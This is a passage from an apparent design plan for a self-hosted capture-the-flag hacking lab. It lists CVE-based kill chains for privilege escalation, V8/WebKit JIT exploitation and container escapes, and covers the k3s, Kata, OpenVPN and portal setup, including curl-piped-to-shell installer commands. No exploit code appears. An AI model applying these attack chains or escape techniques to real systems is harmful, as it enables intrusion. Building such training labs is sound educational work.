| 35 | **GoAnywher** | CVE-2023-0669 | 🔴 9.8 | T1190, T1059.004 | `nmap` → GoAnywhere MFT on 8000 → Discover License portal → AES-encrypted serialized Java object → Blind deserialization → RCE → **root flag** |

### Category 7: Privilege Escalation Chains (36–38)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 36 | **BaronSamedit** | CVE-2021-3156 | 🔴 7.8 | T1190, T1068 | `nmap` → PHP upload on 80 → Upload webshell → Low-priv shell → Identify sudo 1.8.x → Heap-based buffer overflow in `sudoedit -s` → **root flag** |
| 37 | **PwnKit** | CVE-2021-4034 | 🔴 7.8 | T1190, T1068 | `nmap` → Python webapp on 5000 → Jinja2 SSTI → Low-priv shell → Exploit polkit `pkexec` env variable injection → **root flag** |
| 38 | **DirtyPipe** | CVE-2022-0847 | 🔴 7.8 | T1190, T1090, T1068 | `nmap` → SSRF endpoint on 80 → Pivot to internal webapp → SSTI → Low-priv shell → Overwrite `/etc/passwd` via splice pipe bug → **root flag** |

### Category 8: Advanced Exploitation (39–42)

#### Sub-Category 8A: Browser Engine Exploitation (V8/WebKit)

> Binary exploitation targeting JavaScript engine JIT compiler bugs.
> Players connect to a **vulnerable d8/jsc REPL via netcat** or submit scripts to an **automated headless browser** harness.
>
> **Binary Distribution**: Pre-built vulnerable binaries are provided via **GitHub Releases** for each machine. Source build instructions are documented in `v8-build/BUILD_FROM_SOURCE.md` and `jsc-build/BUILD_FROM_SOURCE.md` for users who want to compile from the exact vulnerable commit themselves.

| # | Name | CVE | CVSS | Difficulty | Exploitation Concept |
|---|------|-----|------|------------|---------------------|
| 39 | **V8_MapRem** | CVE-2018-17463 | 🔴 8.8 | 🟢 Entry | **CheckMaps Elimination** — JIT compiler skips type checks → Type confusion → Build `addrof`/`fakeobj` primitives → Arbitrary R/W → Execute shellcode via Wasm RWX page |
| 40 | **V8_TurboConf** | CVE-2020-6418 | 🔴 8.8 | 🟡 Medium | **TurboFan Type Confusion** — Side-effect modeling bug in `JSCreate` → OOB array access → Corrupt ArrayBuffer backing store → Arbitrary R/W → Wasm shellcode |
| 41 | **V8_OOBArray** | CVE-2021-30632 | 🔴 8.8 | 🟡 Medium | **TurboFan OOB Write** — Incorrect range analysis in JIT → JSArray length corruption → Leak compressed pointers → Sandbox bypass → Shellcode |
| 42 | **JSC_JITRCE** | CVE-2020-9802 | 🔴 8.8 | 🔴 Hard | **WebKit DFG JIT** — Optimization bug in DFG → `addrof`/`fakeobj` → Structure ID spray → JIT page RWX → Shellcode with PAC bypass considerations |

#### Sub-Category 8B: Docker & Sandbox Escape (gated behind `--enable-escape-challenges`)

These are **not separate machines** — they are **post-exploitation stages embedded into existing machines**.

> **⚠️ SAFETY**: Escape challenges are **disabled by default**. They must be explicitly enabled via:
> ```bash
> ./run.sh up --enable-escape-challenges
> ```
> When this flag is not set, the escape-relevant misconfigurations (mounted Docker socket, `--privileged`, weak cgroup) are **stripped from the compose files** at runtime. The machines still work for their primary kill chain, but the escape post-exploitation path is locked.
>
> **Hosting users** should **never** enable this flag unless running inside a **disposable VM**.

| Technique | Embedded In | ATT&CK | How It Works | Enabled By |
|-----------|------------|--------|-------------|------------|
| **Docker Socket Escape** | Machine 09 (PressGrave) | T1611 | WordPress container has `/var/run/docker.sock` mounted → spawn host-level container | `--enable-escape-challenges` |
| **Privileged Container Escape** | Machine 21 (WebLogicBmb) | T1611 | Container runs `--privileged` → Mount host filesystem via `/dev/sda1` | `--enable-escape-challenges` |
| **cgroup Escape (CVE-2022-0492)** | Machine 38 (DirtyPipe) | T1611 | After kernel exploit → Escape cgroup v1 via `release_agent` | `--enable-escape-challenges` |
| **runC Escape (CVE-2019-5736)** | Machine 09 alt path | T1611 | Overwrite host `runc` binary via `/proc/self/exe` symlink | `--enable-escape-challenges` |

#### Sub-Category 8C: Multi-Architecture Exploitation (mandatory, separate compose files)

Multi-architecture variants use **dedicated docker-compose override files** that are always available:

```bash
# Standard x86_64 machine
docker compose -f docker-compose.yml up -d

# ARM variant (requires qemu-user-static on host)
docker compose -f docker-compose.yml -f docker-compose.arm64.yml up -d

# MIPS variant (requires qemu-user-static on host)
docker compose -f docker-compose.yml -f docker-compose.mips.yml up -d
```

| Arch Target | Machine | Compose File | How It Works |
|-------------|---------|-------------|-------------|
| **ARM (aarch64)** | Machine 39 (V8_MapRem) | `docker-compose.arm64.yml` | QEMU user-mode emulation. d8 binary compiled for ARM. Player must write ARM shellcode. Bonus flag. |
| **MIPS (mipsel)** | Machine 25 (RedisRaider) | `docker-compose.mips.yml` | Redis compiled for MIPS via `buildx`. Player must adapt payload for MIPS. Bonus flag. |
| **macOS/iOS Concepts** | Machine 42 (JSC_JITRCE) | N/A (educational) | JSC binary from WebKit. Writeup covers PAC bypass theory. Exploit runs on x86 but documents ARM64e differences. |

> **Prerequisite**: Multi-arch support requires `qemu-user-static` installed on the host:
> ```bash
> # Debian/Ubuntu
> sudo apt-get install qemu-user-static binfmt-support
> # Verify
> docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
> ```

---

## 6. CVE Chaining Philosophy

### 6.1 The Cogwheel Principle

```
    ┌─────┐     ┌─────┐     ┌─────┐     ┌─────┐
    │CVE-A│────▶│CVE-B│────▶│Misc.│────▶│CVE-C│
    │Scan │     │RCE  │     │Cred │     │Priv │
    │Info │     │Init │     │Reuse│     │Esc  │
    └─────┘     └─────┘     └─────┘     └─────┘
      Gear 1      Gear 2      Gear 3      Gear 4
```

**No gear turns without the previous one.** Examples:

| Machine | Gear 1 (Recon) | Gear 2 (Foothold) | Gear 3 (Pivot) | Gear 4 (Root) |
|---------|---------------|-------------------|----------------|---------------|
| 09 PressGrave | WPScan finds vuln plugin | SQLi dumps hashes | Theme editor RCE | Docker socket escape |
| 23 JenkinsOwned | Nmap finds Jenkins | CLI file read leaks keys | Decrypt stored secrets | SSH as root |
| 38 DirtyPipe | Nmap finds web service | SSRF reaches internal app | SSTI gives low shell | Kernel exploit to root |

### 6.2 What Makes It "Creative"

- **Non-obvious pivots**: Machine 19 chains a Python deserialization into a Redis lateral move
- **Cross-protocol chaining**: Machine 07 chains AJP (binary protocol) with HTTP Tomcat Manager
- **Data as weapons**: Machine 23 uses leaked cryptographic keys to decrypt other secrets
- **Environment abuse**: Machine 09 uses Docker itself as the escalation vector

---

## 7. Multi-Architecture & Escape Challenges

### 7.1 Implementation Strategy

| Feature | Approach |
|---------|----------|
| **ARM binaries** | `docker buildx` with `--platform linux/arm64` + QEMU user-mode. Dedicated `k8s.arm64.yaml` per machine. |
| **MIPS binaries** | Cross-compilation via `mipsel-linux-gnu-gcc` in build stage. Dedicated `k8s.mips.yaml` per machine. |
| **Docker escape** | Intentionally misconfigured containers — **gated behind admin flag** for host safety |
| **Sandbox escape** | V8/JSC sandbox bypass as part of browser exploitation chain |
| **iOS/macOS concepts** | Educational writeups documenting PAC, AMFI, and sandbox differences |

### 7.2 Escape Challenge Safety — Kata Containers (Firecracker)

Docker/container escape machines are intentionally misconfigured. The question is: *where does the player land after a successful escape?*

**Without Kata (runc):** player escapes → k3s host kernel ← **dangerous**  
**With Kata Firecracker:** player escapes → Kata microVM guest kernel → KVM boundary ← **host is safe**

```
Player inside vulnerable Pod
  → exploits docker.sock / privileged / cgroup escape
  → lands in Kata Firecracker guest Linux (128MB microVM)
  → [KVM hypervisor boundary] ← cannot cross this
  → k3s host node is behind this boundary — fully protected
```

#### Setup (one-time, server side)

```bash
# 1. Verify hardware virtualization support
grep -c "vmx\|svm" /proc/cpuinfo   # must return > 0

# 2. Install Kata Containers + Firecracker backend
bash -c "$(curl -fsSL https://raw.githubusercontent.com/kata-containers/kata-containers/main/utils/kata-manager.sh) install-kata-tools"

# 3. Register RuntimeClass in k3s
kubectl apply -f - <<EOF
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: kata-fc
handler: kata-fc
EOF

# 4. Verify
kubectl run kata-test --image=busybox \
  --overrides='{"spec":{"runtimeClassName":"kata-fc"}}' \
  --rm -it -- uname -r
# Should print Kata guest kernel version, not host kernel
```

#### Pod Spec — Escape Challenge Machine

```yaml
# machines/09_pressgrave/k8s.yaml
spec:
  runtimeClassName: kata-fc        # ← Firecracker microVM wraps everything
  containers:
    - name: pressgrave
      securityContext:
        privileged: true           # intentionally exploitable
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock  # Docker escape vector
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock  # this is the KATA VM's docker sock, not host
```

#### Pod Spec — Normal Machine

```yaml
# machines/01_log4hell/k8s.yaml
spec:
  # no runtimeClassName → default runc (no overhead)
  containers:
    - name: log4hell
      securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
```

#### Isolation Comparison

| | Normal Machine (runc) | Escape Challenge (kata-fc) |
|--|----------------------|---------------------------|
| **Container root** | Root inside container only | Root inside container only |
| **After escape** | Blocked by securityContext | Kata guest kernel (microVM) |
| **Host reachable?** | No (blocked) | No (KVM boundary) |
| **Other users' Pods** | No (NetworkPolicy) | No (NetworkPolicy + KVM) |
| **Overhead** | None | ~128MB RAM, ~150ms startup |

#### Control Summary

| Control | Implementation |
|---------|---------------|
| **Kata runtime** | `runtimeClassName: kata-fc` on escape machine Pods |
| **Admin gating** | Escape machines disabled by default; enabled per-machine via portal `/admin` |
| **NetworkPolicy** | Escape Pods also default-deny; only player's VPN IP allowed in |
| **VT-x requirement** | Kata requires hardware virtualization — documented in setup |


### 8.1 VPN Gateway (OpenVPN — HTB style)

Players receive a personal `.ovpn` file and connect with a single command.

```bash
# Admin one-time setup
./infra/vpn/setup-ca.sh          # initializes PKI, starts OpenVPN server

# Per player (auto-generates .ovpn)
./scripts/add-peer.sh alice      # → infra/vpn/players/alice.ovpn

# Revoke a player instantly
./scripts/revoke-peer.sh alice   # cert added to CRL, file invalidated
```

```yaml
# infra/vpn/docker-compose.yml
services:
  openvpn:
    image: kylemanna/openvpn:latest
    container_name: lm-vpn-gw
    cap_add: [NET_ADMIN]
    ports:
      - "${VPN_PORT:-1194}:1194/udp"
    volumes:
      - ./data:/etc/openvpn
```

Player connects with:
```bash
sudo openvpn alice.ovpn   # stays connected, no further setup needed
```

### 8.2 Kubernetes Orchestration (k3s)

k3s is the recommended Kubernetes distribution — single binary, minimal overhead, runs on a VPS or dedicated server.

```bash
# Install k3s
curl -sfL https://get.k3s.io | sh -

# Verify
kubectl get nodes
```

**Per-user namespace lifecycle** (managed by the portal backend):
```bash
# When user registers
kubectl create namespace user-alice
kubectl apply -f infra/k8s/templates/networkpolicy.yaml -n user-alice

# When user spawns a machine
kubectl apply -f machines/01_WebServer_Runtime/01-log4hell/k8s.yaml -n user-alice

# When user switches machine (previous auto-deleted)
kubectl delete pod -l user=alice -n user-alice
kubectl apply -f machines/.../k8s.yaml -n user-alice

# Admin view — all active sessions
kubectl get pods -A -l managed-by=local-machine
```

### 8.3 Web Portal (Full-Stack — CTFd-style)

**Not** a simple static page — a full web application with user accounts.

**User-facing features:**
- **Registration / Login** — email + username, JWT session tokens
- **Profile page** — download personal `.ovpn`, view stats, change password
- **Machine dashboard** — browse all 42 machines by category and difficulty
- **Spawn button** — one click starts machine in user's k8s namespace, shows IP
- **Flag submission** — paste flag, get points, see correct/wrong feedback
- **Progress heatmap** — visual grid of owned vs. not-owned machines
- **Activity feed** — "alice just rooted Log4Hell", "bob got First Blood on GhostCat"
- **Leaderboard** — public ranking by points (toggle-able by admin)
- **First blood badge** — per-machine badge for first root submission

**Admin-facing features (at `/admin`):**
- **User management** — create, suspend, delete accounts
- **Live cluster view** — see all active Pods per user, kill/restart any
- **Machine health** — live health check status for all machines
- **Flag log** — full history of all flag submissions
- **VPN management** — list peers, revoke, regenerate configs

**Tech stack:**
| Layer | Technology |
|-------|-----------|
| Frontend | Next.js (App Router), Tailwind CSS |
| Backend API | FastAPI (Python) |
| Database | PostgreSQL |
| Auth | JWT (access token + refresh token) |
| K8s integration | `kubernetes` Python client |
| VPN integration | Shell exec to `add-peer.sh` / `revoke-peer.sh` |

### 8.4 Flag Generation

Flags are unique **per user per machine** — prevents flag sharing between players.

```bash
# Each machine generates its flag at Pod startup:
USER_FLAG=$(echo -n "${FLAG_SEED}:${USER_ID}:user_${MACHINE_ID}" | sha256sum | cut -c1-32)
ROOT_FLAG=$(echo -n "${FLAG_SEED}:${USER_ID}:root_${MACHINE_ID}" | sha256sum | cut -c1-32)
echo "FLAG{${USER_FLAG}}" > /home/user/user.txt
echo "FLAG{${ROOT_FLAG}}" > /root/root.txt
```

`USER_ID` is injected as an env var into each Pod by the portal backend at spawn time.

---

## 9. Documentation Strategy

### 9.1 Document Matrix

| Document | Audience | Content |
|----------|----------|---------| 
| `README.md` | Everyone | 30-second overview, quick start, server requirements |
| `docs/01_SETUP.md` | Admin | Install k3s, OpenVPN CA, portal — full server setup |
| `docs/02_ARCHITECTURE.md` | Admin/Dev | K8s topology, per-user namespace model, security boundaries |
| `docs/03_ADMIN_GUIDE.md` | Admin | Day-to-day ops: spawn/kill Pods, manage users, VPN, health |
| `docs/04_PLAYER_GUIDE.md` | Player | Register, download OVPN, connect, pick a machine, methodology |



### 9.2 Per-Machine Documentation

Every machine directory contains:

```
machines/XX_Category/NN-machine-name/
├── Dockerfile                  # Build instructions
├── k8s.yaml                    # Kubernetes Pod + Service manifest
├── healthcheck.sh              # Health validation script
├── config/                     # Service configs, vuln setup scripts
├── README.md                   # Machine card: difficulty, CVE, hints
└── writeup/
    ├── solution.md             # Full step-by-step walkthrough
    ├── exploit.py / exploit.js # Working exploit code
    └── references.md           # CVE links, original advisories, patches
```

---

## 10. Directory Structure

```
Local-Machine/
├── run.sh                                # Admin CLI (up/down/reset/status/vpn)
├── lifecycle-manager.sh                  # Health-check & auto-recovery daemon
├── .env                                  # Global config (FLAG_SEED, SERVER_IP)
├── README.md                             # Project overview
├── LICENSE
├── CONTRIBUTING.md
│
├── docs/
│   ├── 01_SETUP.md                       # k3s + OpenVPN CA + portal install
│   ├── 02_ARCHITECTURE.md                # K8s topology, namespace model
│   ├── 03_ADMIN_GUIDE.md                 # Ops: users, Pods, VPN, health
│   ├── 04_PLAYER_GUIDE.md                # Register, OVPN, connect, hack
│   └── MITRE_ATTACK_MAP.md
│
├── infra/
│   ├── vpn/
│   │   ├── docker-compose.yml            # OpenVPN (kylemanna/openvpn)
│   │   ├── setup-ca.sh                   # One-time PKI init
│   │   ├── data/                         # PKI certs (gitignored)
│   │   └── players/                      # Generated .ovpn files
│   ├── portal/
│   │   ├── frontend/                     # Next.js app
│   │   ├── backend/                      # FastAPI app
│   │   ├── docker-compose.yml
│   │   └── k8s/                          # Portal Deployment + Service manifests
│   └── k8s/
│       ├── templates/
│       │   ├── networkpolicy.yaml        # Default deny + lab-only allow
│       │   └── namespace-rbac.yaml       # Per-user RBAC
│       └── cluster-setup.sh             # k3s init + base manifests
│
├── scripts/
│   ├── add-peer.sh                       # Generate player .ovpn
│   ├── revoke-peer.sh                    # Revoke player cert via CRL
│   ├── generate-all-flags.sh
│   └── validate-machines.sh
│
├── machines/
│   ├── 01_WebServer_Runtime/             # Machines 01–07
│   │   ├── 01-log4hell/
│   │   │   ├── docker-compose.yml
│   │   │   ├── Dockerfile
│   │   │   ├── healthcheck.sh
│   │   │   ├── config/
│   │   │   ├── flags/
│   │   │   ├── README.md
│   │   │   └── writeup/
│   │   │       ├── solution.md
│   │   │       ├── exploit.py
│   │   │       └── references.md
│   │   ├── 02-springbreak/
│   │   ├── 03-pathfinder/
│   │   ├── 04-strutszone/
│   │   ├── 05-shellshocked/
│   │   ├── 06-phpocalypse/
│   │   └── 07-ghostcat/
│   │
│   ├── 02_CMS_WebApp/                    # Machines 08–14
│   │   ├── 08-drupaldoom/
│   │   ├── 09-pressgrave/                # Docker socket escape path
│   │   ├── 10-bulletproof/
│   │   ├── 11-confluencer/
│   │   ├── 12-gitlabyrinth/
│   │   ├── 13-grafanleak/
│   │   └── 14-joombleed/
│   │
│   ├── 03_Framework_Library/             # Machines 15–22
│   │   ├── 15-ignition/
│   │   ├── 16-thinkpwned/
│   │   ├── 17-imagetragick/
│   │   ├── 18-protopoison/
│   │   ├── 19-picklerick/
│   │   ├── 20-jwtwisted/
│   │   ├── 21-weblogicbmb/              # Privileged container escape
│   │   └── 22-react2shell/              # CVE-2025-55182 RSC Flight deser
│   │
│   ├── 04_Enterprise_Middleware/         # Machines 23–28
│   │   ├── 23-jenkinsowned/
│   │   ├── 24-activemqtter/
│   │   ├── 25-redisraider/
│   │   │   ├── docker-compose.yml        # x86_64 (default)
│   │   │   └── docker-compose.mips.yml   # MIPS variant
│   │   ├── 26-mongomayhem/
│   │   ├── 27-elasticpwn/
│   │   └── 28-solrblaze/
│   │
│   ├── 05_NetworkAppliance_Proxy/        # Machines 29–32
│   │   ├── 29-bigipwned/
│   │   ├── 30-citrixbreaker/
│   │   ├── 31-ivantigate/
│   │   └── 32-minioleaker/
│   │
│   ├── 06_Data_FileTransfer/            # Machines 33–35
│   │   ├── 33-moveitmstr/
│   │   ├── 34-apachenght/
│   │   └── 35-goanywher/
│   │
│   ├── 07_Privilege_Escalation/          # Machines 36–38
│   │   ├── 36-baronsamedit/
│   │   ├── 37-pwnkit/
│   │   └── 38-dirtypipe/                # cgroup escape (gated)
│   │
│   └── 08_Advanced_Exploitation/         # Machines 39–42
│       ├── 39-v8-maprem/
│       │   ├── docker-compose.yml        # x86_64 (default, uses pre-built d8)
│       │   ├── docker-compose.arm64.yml  # ARM variant
│       │   ├── Dockerfile
│       │   ├── Dockerfile.arm64
│       │   ├── healthcheck.sh
│       │   ├── v8-build/
│       │   │   └── BUILD_FROM_SOURCE.md  # Full source build instructions
│       │   ├── harness/
│       │   ├── flags/
│       │   ├── README.md
│       │   └── writeup/
│       │       ├── solution.md
│       │       ├── exploit.js
│       │       └── references.md
│       ├── 40-v8-turboconf/
│       ├── 41-v8-oobarray/
│       └── 42-jsc-jitrce/               # PAC bypass documentation
│           ├── docker-compose.yml
│           ├── Dockerfile
│           ├── jsc-build/
│           │   └── BUILD_FROM_SOURCE.md  # Full JSC source build instructions
│           └── ...
│
└── scripts/
    ├── generate-all-flags.sh             # Generate flags for all machines
    ├── reset-machine.sh                  # Reset a single machine
    ├── reset-all.sh                      # Reset all machines
    └── validate-machines.sh              # Test all health checks
```

---

## 11. Implementation Phases

### Phase 1: Foundation (Week 1–2)

| Task | Deliverable |
|------|------------|
| Project scaffolding | Directory structure, `.env`, `run.sh`, `lifecycle-manager.sh` |
| Infrastructure | VPN container, portal stub, shared scripts |
| Template machine | One fully working machine (01-log4hell) as reference |
| Health-check framework | Base health check script, lifecycle manager cron |
| Documentation skeleton | All `docs/` files with structure |

### Phase 2: Core Machines — Web & CMS (Week 3–5)

| Task | Deliverable |
|------|------------|
| Machines 01–07 | Web Server & Runtime category complete with writeups |
| Machines 08–14 | CMS & Web Application category complete with writeups |
| Docker escape (Machine 09) | PressGrave Docker socket escape tested |
| Integration testing | All 14 machines run simultaneously, health checks pass |

### Phase 3: Framework & Enterprise (Week 6–8)

| Task | Deliverable |
|------|------------|
| Machines 15–22 | Framework & Library category complete (incl. React2Shell) |
| Machines 23–28 | Enterprise Middleware category complete |
| Privileged escape (Machine 21) | Container escape tested (with `--enable-escape-challenges`) |
| Multi-arch MIPS (Machine 25) | RedisRaider `docker-compose.mips.yml` variant |
| Load testing | 28 machines concurrent, resource profiling |

### Phase 4: Network, Data & PrivEsc (Week 9–10)

| Task | Deliverable |
|------|------------|
| Machines 29–32 | Network Appliance & Proxy complete |
| Machines 33–35 | Data & File Transfer complete |
| Machines 36–38 | Privilege Escalation Chains complete |
| cgroup escape (Machine 38) | DirtyPipe cgroup escape tested in VM (with `--enable-escape-challenges`) |

### Phase 5: Advanced Exploitation (Week 11–13)

| Task | Deliverable |
|------|------------|
| Machines 39–41 | V8 exploitation challenges (pre-built binaries via GitHub Releases) |
| Machine 42 | JSC/WebKit exploitation with PAC docs |
| ARM variant (Machine 39) | `docker-compose.arm64.yml` QEMU ARM d8 binary tested |
| Source build docs | `BUILD_FROM_SOURCE.md` for V8 and JSC verified |
| All escape paths validated | Tested in VM with `--enable-escape-challenges` |

### Phase 6: Polish & Release (Week 14–15)

| Task | Deliverable |
|------|------------|
| Documentation finalized | All docs complete, no placeholders |
| Web portal complete | Status dashboard + light gamification operational |
| Full integration test | All 42 machines simultaneously |
| Security audit | Escape machines validated in VM (flag-gated) |
| Open source prep | LICENSE, CONTRIBUTING.md, CI pipeline, pre-built binary releases |

---

## 12. Verification Plan

### 12.1 Automated Tests

```bash
# Per-machine validation
./scripts/validate-machines.sh           # Health checks on all 42 machines
./scripts/validate-machines.sh 01        # Single machine validation

# Integration test (standard — no escape challenges)
docker compose -f docker-compose.yml up -d
for i in machines/*/*/docker-compose.yml; do
  docker compose -f "$i" up -d
done
./scripts/validate-machines.sh

# Integration test (with escape challenges — VM only!)
./run.sh up --enable-escape-challenges
./scripts/validate-machines.sh --include-escapes

# Multi-arch test
docker compose -f machines/04_Enterprise_Middleware/25-redisraider/docker-compose.yml \
               -f machines/04_Enterprise_Middleware/25-redisraider/docker-compose.mips.yml up -d
docker compose -f machines/08_Advanced_Exploitation/39-v8-maprem/docker-compose.yml \
               -f machines/08_Advanced_Exploitation/39-v8-maprem/docker-compose.arm64.yml up -d
```

### 12.2 Manual Verification

| Check | Method |
|-------|--------|
| Kill chain works end-to-end | Solve each machine following writeup |
| Flags are unique per seed | Change `FLAG_SEED`, verify flags change |
| Health checks detect failure | Kill the vulnerable service, verify restart |
| Lifecycle manager resets at 60 min | Start machine, wait 61 min, verify fresh state |
| Escape flag gating works | Run without `--enable-escape-challenges`, verify Docker socket not mounted |
| Escape challenges contained | Run with flag in VM, verify no host damage |
| Multi-arch compose files work | Run ARM/MIPS via `-f docker-compose.arm64.yml` override |
| Pre-built binaries match source | Build V8/JSC from source, diff against pre-built |
| Gamification tracking works | Submit flags via portal, verify points and progress |
| Documentation accuracy | Follow every doc as a new user |

---

## Decisions Log (Resolved)

| # | Question | Decision | Impact |
|---|----------|----------|--------|
| Q1 | Portal: gamification or simple dashboard? | **Full CTFd-style web app** — Registration, JWT auth, OVPN download from profile, machine dashboard with Spawn button, leaderboard, first blood, activity feed. Admin panel at `/admin`. | §8.3 portal spec, §3.5 player flow |
| Q2 | Escape challenges: always-on or gated? | **Gated — admin enables per-machine via portal** — Escape misconfigs are stripped at runtime by default. Machines still work for primary kill chain without them. | §7.2 safety controls |
| Q3 | Multi-arch: optional overrides or mandatory? | **Mandatory, separate `k8s.{arch}.yaml` files** — Each multi-arch machine ships with dedicated Kubernetes manifests for ARM/MIPS. | §7.1, dir structure §10 |
| Q4 | Browser exploit binaries: pre-built or source? | **Pre-built via GitHub Releases + source build documentation** — `BUILD_FROM_SOURCE.md` in each machine's build dir. | §8A, dir structure §10 |
| Q5 | New machine: React2Shell? | **Added as Machine 22 (CVE-2025-55182)** — CVSS 10.0, React Server Components Flight protocol insecure deserialization. | Machine list §5, §8B |
| Q6 | Orchestration: Docker Compose vs Kubernetes? | **Kubernetes (k3s)** — Enables true per-user namespace isolation, one-Pod-at-a-time enforcement, and flat resource scaling regardless of user count. Docker Compose remains for local dev only. | §3 entire architecture rewrite |
| Q7 | VPN: WireGuard vs OpenVPN? | **OpenVPN** — `.ovpn` file is fully self-contained (CA cert + client cert + key in one file). Player runs one command and is connected. Matches HTB UX exactly. Scripts: `setup-ca.sh`, `add-peer.sh`, `revoke-peer.sh`. | §8.1, infra/vpn/ |
| Q8 | Flag uniqueness: global or per-user? | **Per-user** — `FLAG_SEED + USER_ID + MACHINE_ID` hash. Prevents players sharing flags. Each user's flags are different even on the same machine. | §8.4 flag generation |
| Q9 | Escape challenge host safety: disposable VM vs. container runtime? | **Kata Containers (Firecracker backend)** — escape challenge Pods use `runtimeClassName: kata-fc`. Player escapes to Kata's microVM guest kernel, not the k3s host. KVM hypervisor boundary is the containment. No separate VM needed. Requires VT-x/AMD-V on server. | §7.2, docs/02_ARCHITECTURE.md, docs/03_ADMIN_GUIDE.md |
| Q10 | Machine IP assignment: fixed (10.10.x.x) vs dynamic Pod IP? | **Dynamic Pod IP** — k8s assigns IPs from Pod CIDR (10.42.0.0/16). Portal reads live IP post-spawn, stores in DB, displays to user. Zero routing complexity. 50 users running same machine = 50 different IPs, zero config. Refresh auto-respawns crashed Pods with new IP. | §3.2, §3.3 |


